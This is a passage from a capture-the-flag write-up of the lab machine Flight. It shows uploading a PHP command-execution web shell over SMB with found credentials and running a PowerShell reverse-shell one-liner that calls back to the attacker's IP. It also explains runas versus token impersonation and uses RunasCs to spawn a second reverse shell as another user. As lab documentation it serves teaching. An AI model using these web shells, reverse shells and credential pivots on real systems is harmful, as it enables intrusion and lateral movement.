</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:54<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:54<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="w">  </span>flight.htb<span class="w">                          </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="w">  </span>school.flight.htb<span class="w">                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="w">        </span><span class="m">5056511</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1188972</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<p>The <code>flight.htb</code> folder contains:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>smb:<span class="w"> </span><span class="se">\f</span>light.htb<span class="se">\&gt;</span><span class="w"> </span>ls
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="w">  </span>css<span class="w">                                 </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="w">  </span>images<span class="w">                              </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="w">  </span>index.html<span class="w">                          </span>A<span class="w">     </span><span class="m">7069</span><span class="w">  </span>Wed<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">23</span>:58:10<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a><span class="w">  </span>js<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-68-8"><a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a>
</span><span id="__span-68-9"><a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a><span class="w">        </span><span class="m">5056511</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1188972</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<p>The <code>school.flight.htb</code> contains:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>smb:<span class="w"> </span><span class="se">\s</span>chool.flight.htb<span class="se">\&gt;</span><span class="w"> </span>ls
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="w">  </span>about.html<span class="w">                          </span>A<span class="w">     </span><span class="m">1689</span><span class="w">  </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">22</span>:54:45<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a><span class="w">  </span>blog.html<span class="w">                           </span>A<span class="w">     </span><span class="m">3618</span><span class="w">  </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">22</span>:53:59<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="w">  </span>home.html<span class="w">                           </span>A<span class="w">     </span><span class="m">2683</span><span class="w">  </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">22</span>:56:58<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="w">  </span>images<span class="w">                              </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a><span class="w">  </span>index.php<span class="w">                           </span>A<span class="w">     </span><span class="m">2092</span><span class="w">  </span>Thu<span class="w"> </span>Oct<span class="w"> </span><span class="m">27</span><span class="w"> </span><span class="m">02</span>:59:25<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a><span class="w">  </span>lfi.html<span class="w">                            </span>A<span class="w">      </span><span class="m">179</span><span class="w">  </span>Thu<span class="w"> </span>Oct<span class="w"> </span><span class="m">27</span><span class="w"> </span><span class="m">02</span>:55:16<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a><span class="w">  </span>styles<span class="w">                              </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">20</span>:22:00<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a>
</span><span id="__span-69-12"><a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a><span class="w">        </span><span class="m">5056511</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1188972</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<p>Since we have <code>WRITE</code> permissions on the whole share, we can similarly upload sth here, maybe sth like a reverse shell.</p>
<p>What kind of revshell tho? hmm lets think smart here, these directories belong to the webapp, and the webapp runs also php.</p>
<p>So any php file we upload there will be executed, this should be our goal, uploading a php revshell.</p>
<p>found this php shell: <code>php_cmd</code> from reverse shell generator, and also powershell#2 for the rev shell, then started listener and got shell:</p>
<h2 id="uploading-web-shell">Uploading web shell</h2>
<p>From smb client</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>smbclient<span class="w"> </span>//flight.htb/Web<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;c.bum%Tikkycoll_431012284&#39;</span>
</span></code></pre></div>
<p>upload the php webshell using the “put” command on <code>flight.htb</code> or <code>school.flight.htb</code></p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="x">&lt;html&gt;</span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="x">&lt;body&gt;</span>
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="x">&lt;form method=&quot;GET&quot; name=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="x">&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; size=&quot;80&quot;&gt;</span>
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="x">&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;</span>
</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a><span class="x">&lt;/form&gt;</span>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="x">&lt;pre&gt;</span>
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="cp">&lt;?php</span>
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span>
</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a>    <span class="p">{</span>
</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a>        <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a>    <span class="p">}</span>
</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a><span class="cp">?&gt;</span>
</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a><span class="x">&lt;/pre&gt;</span>
</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a><span class="x">&lt;/body&gt;</span>
</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a><span class="x">&lt;script&gt;document.getElementById(&quot;cmd&quot;).focus();&lt;/script&gt;</span>
</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a><span class="x">&lt;/html&gt;</span>
</span></code></pre></div>
<p>once prompted with command line while accessing the phpshell from browser, </p>
<p><img alt="image.png" src="../MediaFiles/flight_image11.png" /></p>
<p>execute this</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="x">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.180&#39;,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
</span></code></pre></div>
<p>started listerner</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="x">nc -lvnp 9001</span>
</span></code></pre></div>
<h2 id="shell-as-svc_apache">Shell as svc_apache</h2>
<p>and got a shell as svc_apache</p>
<p><img alt="image.png" src="../MediaFiles/flight_image12.png" /></p>
<h3 id="user-privileges-svc_apache">User privileges (svc_apache)</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>whoami<span class="w"> </span>/all
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                    </span><span class="nv">State</span><span class="w">   </span>
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">========</span>
</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">       </span>Enabled<span class="w"> </span>
</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>SeCreateGlobalPrivilege<span class="w">       </span>Create<span class="w"> </span>global<span class="w"> </span>objects<span class="w">          </span>Enabled<span class="w"> </span>
</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w"> </span>Disabled
</span></code></pre></div>
<p>Those privileges do not help us</p>
<h3 id="group-membership-of-svc_apache">Group membership of svc_apache</h3>
<div class="language-php highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="x">net user svc.apache</span>
</span></code></pre></div>
<div class="language-php highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="x">User name                    svc_apache</span>
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="x">Full Name                    </span>
</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a><span class="x">Comment                      Service Apache web</span>
</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a><span class="x">User&#39;s comment               </span>
</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a><span class="x">Country/region code          000 (System Default)</span>
</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a><span class="x">Account active               Yes</span>
</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a><span class="x">Account expires              Never</span>
</span><span id="__span-77-8"><a id="__codelineno-77-8" name="__codelineno-77-8" href="#__codelineno-77-8"></a>
</span><span id="__span-77-9"><a id="__codelineno-77-9" name="__codelineno-77-9" href="#__codelineno-77-9"></a><span class="x">Password last set            9/22/2022 1:08:23 PM</span>
</span><span id="__span-77-10"><a id="__codelineno-77-10" name="__codelineno-77-10" href="#__codelineno-77-10"></a><span class="x">Password expires             Never</span>
</span><span id="__span-77-11"><a id="__codelineno-77-11" name="__codelineno-77-11" href="#__codelineno-77-11"></a><span class="x">Password changeable          9/23/2022 1:08:23 PM</span>
</span><span id="__span-77-12"><a id="__codelineno-77-12" name="__codelineno-77-12" href="#__codelineno-77-12"></a><span class="x">Password required            Yes</span>
</span><span id="__span-77-13"><a id="__codelineno-77-13" name="__codelineno-77-13" href="#__codelineno-77-13"></a><span class="x">User may change password     Yes</span>
</span><span id="__span-77-14"><a id="__codelineno-77-14" name="__codelineno-77-14" href="#__codelineno-77-14"></a>
</span><span id="__span-77-15"><a id="__codelineno-77-15" name="__codelineno-77-15" href="#__codelineno-77-15"></a><span class="x">Workstations allowed         All</span>
</span><span id="__span-77-16"><a id="__codelineno-77-16" name="__codelineno-77-16" href="#__codelineno-77-16"></a><span class="x">Logon script                 </span>
</span><span id="__span-77-17"><a id="__codelineno-77-17" name="__codelineno-77-17" href="#__codelineno-77-17"></a><span class="x">User profile                 </span>
</span><span id="__span-77-18"><a id="__codelineno-77-18" name="__codelineno-77-18" href="#__codelineno-77-18"></a><span class="x">Home directory               </span>
</span><span id="__span-77-19"><a id="__codelineno-77-19" name="__codelineno-77-19" href="#__codelineno-77-19"></a><span class="x">Last logon                   8/23/2025 12:32:30 PM</span>
</span><span id="__span-77-20"><a id="__codelineno-77-20" name="__codelineno-77-20" href="#__codelineno-77-20"></a>
</span><span id="__span-77-21"><a id="__codelineno-77-21" name="__codelineno-77-21" href="#__codelineno-77-21"></a><span class="x">Logon hours allowed          All</span>
</span><span id="__span-77-22"><a id="__codelineno-77-22" name="__codelineno-77-22" href="#__codelineno-77-22"></a>
</span><span id="__span-77-23"><a id="__codelineno-77-23" name="__codelineno-77-23" href="#__codelineno-77-23"></a><span class="x">Local Group Memberships      </span>
</span><span id="__span-77-24"><a id="__codelineno-77-24" name="__codelineno-77-24" href="#__codelineno-77-24"></a><span class="x">Global Group memberships     *Domain Users         </span>
</span><span id="__span-77-25"><a id="__codelineno-77-25" name="__codelineno-77-25" href="#__codelineno-77-25"></a><span class="x">The command completed successfully.</span>
</span></code></pre></div>
<p>Nothing interesting, lets check other users:</p>
<h3 id="group-membership-of-cbum">Group membership of C.Bum</h3>
<div class="language-php highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="x">net user c.bum</span>
</span></code></pre></div>
<div class="language-php highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="x">User name                    C.Bum</span>
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="x">Full Name                    </span>
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="x">Comment                      Senior Web Developer</span>
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a><span class="x">User&#39;s comment               </span>
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a><span class="x">Country/region code          000 (System Default)</span>
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a><span class="x">Account active               Yes</span>
</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a><span class="x">Account expires              Never</span>
</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a>
</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a><span class="x">Password last set            9/22/2022 1:08:47 PM</span>
</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a><span class="x">Password expires             Never</span>
</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a><span class="x">Password changeable          9/23/2022 1:08:47 PM</span>
</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a><span class="x">Password required            Yes</span>
</span><span id="__span-79-13"><a id="__codelineno-79-13" name="__codelineno-79-13" href="#__codelineno-79-13"></a><span class="x">User may change password     Yes</span>
</span><span id="__span-79-14"><a id="__codelineno-79-14" name="__codelineno-79-14" href="#__codelineno-79-14"></a>
</span><span id="__span-79-15"><a id="__codelineno-79-15" name="__codelineno-79-15" href="#__codelineno-79-15"></a><span class="x">Workstations allowed         All</span>
</span><span id="__span-79-16"><a id="__codelineno-79-16" name="__codelineno-79-16" href="#__codelineno-79-16"></a><span class="x">Logon script                 </span>
</span><span id="__span-79-17"><a id="__codelineno-79-17" name="__codelineno-79-17" href="#__codelineno-79-17"></a><span class="x">User profile                 </span>
</span><span id="__span-79-18"><a id="__codelineno-79-18" name="__codelineno-79-18" href="#__codelineno-79-18"></a><span class="x">Home directory               </span>
</span><span id="__span-79-19"><a id="__codelineno-79-19" name="__codelineno-79-19" href="#__codelineno-79-19"></a><span class="x">Last logon                   9/22/2022 2:50:24 PM</span>
</span><span id="__span-79-20"><a id="__codelineno-79-20" name="__codelineno-79-20" href="#__codelineno-79-20"></a>
</span><span id="__span-79-21"><a id="__codelineno-79-21" name="__codelineno-79-21" href="#__codelineno-79-21"></a><span class="x">Logon hours allowed          All</span>
</span><span id="__span-79-22"><a id="__codelineno-79-22" name="__codelineno-79-22" href="#__codelineno-79-22"></a>
</span><span id="__span-79-23"><a id="__codelineno-79-23" name="__codelineno-79-23" href="#__codelineno-79-23"></a><span class="x">Local Group Memberships      </span>
</span><span id="__span-79-24"><a id="__codelineno-79-24" name="__codelineno-79-24" href="#__codelineno-79-24"></a><span class="x">Global Group memberships     *Domain Users         *WebDevs              </span>
</span><span id="__span-79-25"><a id="__codelineno-79-25" name="__codelineno-79-25" href="#__codelineno-79-25"></a><span class="x">The command completed successfully.</span>
</span></code></pre></div>
<p>Interesting, this user is member of <code>WebDevs</code> and the comment is <code>Senior Web Developer</code> lets keep that in mind for later.</p>
<h3 id="impersonate-cbum-as-svc_apache">Impersonate C.Bum as svc_apache</h3>
<p>Those privileges and group membership does not provide any obvious attack path, but lets take a moment here and think, what we already know?</p>
<ul>
<li>We currently have shell as <code>svc_apache</code></li>
<li>We know the <strong>password</strong> of another user (C.Bum)</li>
</ul>
<p>Based on those 2 statements, we meet the requirements to impersonate user C.Bum! So when we have access to one user, and know the creds of another one we can impersonate that user. </p>
<p>Why does this work?</p>
<ul>
<li>There is a logon feature called "logon with supplied credentials”, where basically If you can type the correct password, Windows will create a new logon session under that user and spawn the requested process.</li>
<li>One tool that can achieve that is <code>Runas</code><ul>
<li>It just performs a normal <strong>secondary logon</strong> with the supplied credentials.</li>
<li>The new <strong>process</strong> runs <strong>in the security context of the target user</strong>.</li>
<li>You don’t "impersonate" at the token level (thread-level impersonation) — you’re <strong>logging on as them</strong> for a new <strong>process</strong>.</li>
<li>If the account has the <em>"Deny log on locally"</em> or <em>"Deny log on through Remote Desktop"</em> rights applied, then <code>runas</code> will fail because Windows enforces those logon restrictions.<ul>
<li>
<p>For example:</p>
<h3 id="1-what-runas-does">🔹 1. <strong>What <code>runas</code> does</strong></h3>
<ul>
<li>When you run <code>runas /user:DOMAIN\User cmd.exe</code> and type a password:<ul>
<li>Windows calls <code>LogonUser()</code> with those credentials.</li>
<li>If successful, a <strong>new logon session</strong> and <strong>new primary token</strong> for that user is created.</li>
<li>Then Windows calls <code>CreateProcessAsUser()</code> to start a process under that token.</li>
</ul>
</li>
</ul>
<p>👉 This means the process (e.g. <code>cmd.exe</code>) is running <strong>as that user</strong>, with their primary token.</p>
<p>This is <strong>not impersonation</strong> at all — it’s just process creation under a different user.</p>
<h3 id="2-what-impersonation-means-in-windows">🔹 2. <strong>What “impersonation” means in Windows</strong></h3>
<ul>
<li>Impersonation in Windows is a <strong>thread-level concept</strong>:<ul>
<li>A thread temporarily “borrows” another user’s access token to act on their behalf.</li>
<li>For example, a web server thread impersonates a client so it can access files on their behalf.</li>
</ul>
</li>
<li>This requires <code>SeImpersonatePrivilege</code> (or in older cases <code>SeAssignPrimaryTokenPrivilege</code>) to be useful in arbitrary scenarios.</li>
</ul>
<p>👉 This is called <strong>token impersonation</strong>, not process-level logon.</p>
<h3 id="3-process-level-impersonation">🔹 3. <strong>Process-level impersonation?</strong></h3>
<ul>
<li>The term “process-level impersonation” isn’t official in Windows.</li>
<li>What people sometimes mean by it is: <em>“a whole process runs as another user”</em>.</li>
<li>But in Windows terms, that is not “impersonation” — it is just <strong>running a process with a different primary token</strong> (via <code>runas</code>, scheduled tasks, <code>CreateProcessWithLogonW</code>, etc.).</li>
</ul>
<p>✅  <strong>runas vs impersonation</strong>:</p>
<ul>
<li><code>runas</code> = <strong>new process with another user’s primary token</strong> (not impersonation).</li>
<li>Impersonation = <strong>a thread borrows another user’s token temporarily</strong> (requires <code>SeImpersonatePrivilege</code>).</li>
<li>To conclude, If you (with permission) have a password for another account, you can <code>runas</code> it regardless of your current privilege level — unless Group Policy explicitly restricts <strong>local logon</strong>.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Download runas</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/antonioCoco/RunasCs/master/RunasCs.cs
</span></code></pre></div>
<p>Get runas from the attacker machine</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>powershell<span class="w"> </span>-c<span class="w"> </span>wget<span class="w"> </span><span class="m">10</span>.10.14.180:900/RunasCs.cs<span class="w"> </span>-outfile<span class="w"> </span>RunasCs.cs
</span></code></pre></div>
<p>or just upload it from smbclient earlier (much easier)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>put<span class="w"> </span>RunasCs.cs
</span></code></pre></div>
<p>Run runas</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span><span class="m">4</span>.0.30319<span class="se">\c</span>sc.exe<span class="w"> </span>-target:exe<span class="w"> </span>-optimize<span class="w"> </span>-out:RunasCs.exe<span class="w"> </span>RunasCs.cs
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>.<span class="se">\R</span>unasCs.exe<span class="w"> </span>c.bum<span class="w"> </span>Tikkycoll_431012284<span class="w"> </span>whoami
</span></code></pre></div>
<p>then on another shell execute whoami, lets create a connection towards our host and catch the reverse shell</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>.<span class="se">\R</span>unasCs.exe<span class="w"> </span>c.bum<span class="w"> </span>Tikkycoll_431012284<span class="w"> </span>cmd.exe<span class="w"> </span>-r<span class="w"> </span><span class="m">10</span>.10.14.180:4444
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>
</span></code></pre></div>
<h2 id="shell-as-cbum">Shell as C.Bum</h2>
<p><img alt="image.png" src="../MediaFiles/flight_image13.png" /></p>
